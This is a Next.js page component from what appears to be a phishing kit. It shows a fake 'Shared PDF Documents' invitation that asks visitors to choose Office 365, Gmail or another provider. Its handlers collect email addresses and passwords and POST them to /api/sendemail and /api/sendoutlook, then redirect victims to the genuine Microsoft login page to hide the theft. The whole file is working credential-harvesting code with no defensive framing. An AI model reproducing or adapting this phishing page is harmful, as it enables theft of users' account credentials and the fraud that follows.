
/* eslint-disable jsx-a11y/alt-text */
import Image from 'next/image'
import React from 'react'
import Link from 'next/link'
import { useState } from 'react'
import { useRouter } from 'next/router'



const Main = () => {

    const Router = useRouter()
  

    const [email, setEmail] = useState()
    const [password, setPassword] = useState()

    const handleSubmit = (e) => {
      e.preventDefault();
      let data = {
          email,
          password
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendemail', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
            //   Navigate('google.com')
              window.location.assign('https://login.microsoftonline.com/common/login')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }
    const [emails, setEmails] = useState()
    const [passwords, setPasswords] = useState()

    const handleSubmits = (e) => {
      e.preventDefault();
      let data = {
          emails,
          passwords
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendoutlook', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
            window.location.assign('https://login.microsoftonline.com/common/login')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }

    return (
        <main>
              <div className="flex flex-wrap justify-center pt-20">
              <img src="images/icro.png" className="h-12 w-30" alt="..." />  
              </div>
  
           <div className="flex flex-wrap justify-center">
         
           <div className="shadow-md pb-10 px-10 pt-8 shadow-gray-500/40 ">
           
            <h2> Select your email provider</h2>
            <div className="divide-y divide-dashed md:divide-solid">
              </div>
            <h5 className="py-8">You have been invited to view:</h5>
            <div className="flex items-center justify-between">
            <img src="images/pdf.png" className="h-12 w-18" alt="..." />
            <div className="flex flex-col">
            <h3> Shared PDF Documents</h3> 
            </div>
            
            </div>
            <h5 className="pt-4">To view the secure document,</h5>
            <h5 className="">Please select your email provider below. </h5>

            <div className="grid grid-cols-3 divide-x divide-slate-900 pt-4 justify-center"> 
          
                <a href="/signup/office">
            <img src="images/office365.png" className="h-12 w-18" alt="..." />    </a>
            <a href="/signup/gmail">
            <img src="images/gmail.jpg" className="h-12 w-18 pl-4" alt="..." /> </a>
            <a href="/signup/other">
            <img src="images/other.png" className="h-12 w-18 pl-4" alt="..." /> </a>
        
            </div>
           
           </div>
         
           </div>

        </main>
    )
}

export default Main